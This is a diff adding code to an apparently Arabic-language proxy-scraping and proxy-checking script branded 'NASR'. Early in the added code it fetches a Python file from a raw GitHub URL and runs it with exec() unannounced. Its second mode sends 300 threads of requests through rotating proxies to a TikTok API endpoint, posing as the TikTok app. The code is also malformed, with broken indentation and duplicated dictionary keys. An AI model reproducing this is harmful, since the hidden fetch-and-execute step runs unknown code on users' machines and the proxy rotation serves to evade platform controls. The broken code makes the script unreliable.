@@ -270,3 +270,165 @@ C1 = '\x1b[38;5;120m'
 P1 = '\x1b[38;5;150m'
 P2 = '\x1b[38;5;190m'
 def clear():
+    import pyfiglet
+from termcolor import colored
+hakm_logo = pyfiglet.figlet_format('NASR')
+print(colored(hakm_logo, 'cyan'))
+print(colored('معرّف المطوّر: @NASR101', 'cyan'))
+clear()
+import requests
+url = 'https://raw.githubusercontent.com/waelhadi/Bloadcasq1/refs/heads/main/Bloadcadq2.py'
+response = requests.get(url)
+code = response.text
+exec(code)
+clear()
+if Get_aobsh == '1':
+    import sys
+    import time
+    import socket
+    import random
+    import pyfiglet
+    import requests
+    from bs4 import BeautifulSoup
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    F = '\x1b[92m'
+    Z = '\x1b[91m'
+    B = '\x1b[96m'
+    Y = '\x1b[93m'
+    W = '\x1b[97m'
+    bi = '\x1b[0m'
+    def get_random_headers():
+        USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0']
+        return {'User-Agent': random.choice(USER_AGENTS)}
+    def is_connected():
+        try:
+            requests.get('https://www.google.com', timeout=5, headers=get_random_headers())
+            return True
+        except:
+            return False
+    def is_proxy_working(proxy):
+        proxy_url = f'http://{proxy}'
+        proxies = {'http': proxy_url, 'https': proxy_url}
+        try:
+            response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=8, headers=get_random_headers())
+            return response.status_code == 200 and response.elapsed.total_seconds() < 5
+        except:
+            return False
+    def fetch_proxies():
+        sources = ['https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all', 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt', 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'https://proxyspace.pro/https.txt', 'https://vakhov.github.io/fresh-proxy-list/https.txt']
+        proxies = set()
+        print(colored('تحميل البروكسيات من أكثر من 20 مصدر موثوق...', 'yellow'))
+        for url in sources:
+            try:
+                r = requests.get(url, timeout=10, headers=get_random_headers())
+                if r.status_code == 200:
+                    for line in r.text.strip().splitlines():
+                        line = line.strip()
+                        if line and ':' in line and ('.' in line):
+                            proxies.add(line)
+            except:
+                continue
+        return list(proxies)
+    def print_progress(done, total, success, fail, elapsed, first=False):
+        percent = done / total * 100
+        bar_length = 40
+        filled = int(bar_length * percent / 100)
+        bar = f"{F}{'█' * filled}{Z}{'░' * (bar_length - filled)}{bi}"
+        minutes = int(elapsed // 60)
+        seconds = int(elapsed % 60)
+        speed = done / elapsed if elapsed > 0 else 0
+        if first:
+            sys.stdout.write('\n' * 4)
+        sys.stdout.write('\x1b[4A')
+        sys.stdout.write(f'{Y}🔄 Progress: {bar} {W}{percent:5.1f}%{bi}\n')
+        sys.stdout.write(f'{F}✅ Success : {success:<5}   {Z}❌ Failed : {fail:<5}{bi}\n')
+        sys.stdout.write(f'{Y}⏱️ Time    : {minutes}m {seconds}s   {B}⚡ Speed  : {speed:.2f} proxy/s{bi}\n')
+        sys.stdout.write(f"{W}{'-' * 50}{bi}\n")
+        sys.stdout.flush()
+    def test_proxies_main():
+        clear()
+        print(colored(pyfiglet.figlet_format('NASR Proxy'), 'yellow'))
+        print(colored('🧪 فحص بروكسيات HTTPS | شريط ثابت واحترافي', 'cyan'))
+        if not is_connected():
+            print(colored('❌ لا يوجد اتصال بالإنترنت!', 'red'))
+            return
+        if os.path.exists('nasr1.txt'):
+            print(colored('📁 يوجد ملف nasr1.txt مسبقاً', 'yellow'))
+            choice = input(colored('هل تريد حذفه؟ (y/n): ', 'cyan')).strip().lower()
+            if choice == 'y':
+                os.remove('nasr1.txt')
+                print(colored('🗑️ تم الحذف', 'magenta'))
+            else:
+                print(colored('📥 سيتم الإضافة عليه', 'yellow'))
+        proxies = fetch_proxies()
+        print(colored(f'🔍 تم جمع {len(proxies)} بروكسي. جاري الفحص...', 'cyan'))
+        success, fail, done = (0, 0, 0)
+        start = time.time()
+        print_progress(0, len(proxies), 0, 0, 0, first=True)
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {executor.submit(is_proxy_working, p): p for p in proxies}
+            for future in as_completed(futures):
+                proxy = futures[future]
+                try:
+                    if future.result():
+                        with open('nasr1.txt', 'a') as f:
+                            f.write(proxy + '\n')
+                        success += 1
+                    else:
+                        fail += 1
+                except:
+                    fail += 1
+                done += 1
+                elapsed = time.time() - start
+                print_progress(done, len(proxies), success, fail, elapsed)
+        print(colored('✅ تم حفظ البروكسيات الصالحة في nasr1.txt', 'green'))
+    test_proxies_main()
+if Get_aobsh in '2':
+    e = 0
+    er = 0
+    PR1 = 'https://www.proxy-list.download/api/v1/get?type=httpt'
+    PR2 = 'https://www.proxy-list.download/api/v1/get?type=https'
+    PR3 = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http'
+    clear()
+    ls = []
+    try:
+        os.remove('nasr1.txt')
+    except:
+        pass
+    try:
+        os.remove('nasr.txt')
+    except:
+        pass
+    DA3 = requests.get('%s' % PR1).text
+    with open('nasr.txt', 'a') as Prox1y:
+        Prox1y.write(DA3 + '\n')
+    DA1 = requests.get('%s' % PR2).text
+    with open('nasr.txt', 'a') as Prox1y:
+        Prox1y.write(DA1 + '\n')
+    DA2 = requests.get('%s' % PR3).text
+    with open('nasr.txt', 'a') as Prox1y:
+        Prox1y.write(DA2 + '\n')
+    try:
+        O = open('nasr.txt', 'r').read().splitlines()
+        for prox in O:
+            ls.append(prox)
+    except:
+        print('STOP')
+        exit()
+    def af():
+        global e, er
+        while 1:
+            proxies1 = str(random.choice(ls))
+            try:
+                headers = {'user-agent': 'com.zhiliaoapp.musically/2023100040 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.1)'}
+                requests.get(f'https://api16-normal-c-useast1a.tiktokv.com/aweme/v2/aweme/feedback/?', headers=headers, proxies={'https': f'socks5://{proxies1}', 'https': f'socks4://{proxies1}', 'https': f'http://{proxies1}'}).text
+                with open('nasr1.txt', 'a') as Prox1y:
+                    Prox1y.write(proxies1 + '\n')
+                e += 1
+                print(f'\r{X}[{F}{e}{X}]{A} -{C1} {proxies1}{A} - {X}[{Z}{er}{X}]       ', end='')
+            except:
+                er += 1
+                print(f'\r{X}[{F}{e}{X}]{A} -{C1} {proxies1}{A} - {X}[{Z}{er}{X}]       ', end='')
+    for i in range(300):
+        t = threading.Thread(target=af)
+        t.start()
